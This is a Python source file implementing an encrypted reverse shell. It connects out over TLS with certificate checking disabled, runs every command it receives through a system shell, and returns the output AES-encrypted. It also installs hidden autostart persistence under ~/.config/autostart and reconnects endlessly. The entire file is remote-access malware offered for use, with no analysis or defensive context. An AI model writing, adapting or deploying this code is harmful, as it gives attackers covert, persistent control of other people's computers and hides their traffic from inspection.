import socket
import ssl
import subprocess
import threading
import time
import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

class EncryptedReverseShell:
    def __init__(self, host='127.0.0.1', port=4444, key=b'your_key_here_32bytes'):
        self.host = host
        self.port = port
        self.key = key
        self.iv = b'your_iv_here_16bytes'
        self.running = True
        
    def encrypt(self, data):
        cipher = Cipher(algorithms.AES(self.key), modes.CFB(self.iv), backend=default_backend())
        encryptor = cipher.encryptor()
        return encryptor.update(data) + encryptor.finalize()

    def decrypt(self, data):
        cipher = Cipher(algorithms.AES(self.key), modes.CFB(self.iv), backend=default_backend())
        decryptor = cipher.decryptor()
        return decryptor.update(data) + decryptor.finalize()

    def establish_connection(self):
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ssl_sock = context.wrap_socket(sock, server_hostname=self.host)
        ssl_sock.connect((self.host, self.port))
        return ssl_sock

    def handle_commands(self, conn):
        while self.running:
            try:
                data = conn.recv(4096)
                if not data:
                    break
                    
                cmd = self.decrypt(data).decode('utf-8')
                if cmd.lower() == 'exit':
                    self.running = False
                    break
                    
                result = subprocess.run(cmd, shell=True, capture_output=True)
                response = self.encrypt(result.stdout + result.stderr)
                conn.send(response)
                
            except Exception as e:
                error_msg = f"[ERROR] {str(e)}".encode('utf-8')
                conn.send(self.encrypt(error_msg))

    def persist(self):
        # Add startup persistence
        startup_dir = os.path.expanduser("~/.config/autostart")
        os.makedirs(startup_dir, exist_ok=True)
        
        script_path = os.path.join(startup_dir, "shell.desktop")
        with open(script_path, "w") as f:
            f.write(f"""[Desktop Entry]
Type=Application
Name=Reverse Shell
Exec={os.path.abspath(__file__)}
Hidden=true
""")

    def run(self):
        self.persist()
        while True:
            try:
                conn = self.establish_connection()
                self.handle_commands(conn)
            except Exception as e:
                print(f"[!] Connection failed: {e}")
                time.sleep(5)

if __name__ == "__main__":
    shell = EncryptedReverseShell()
    shell.run()
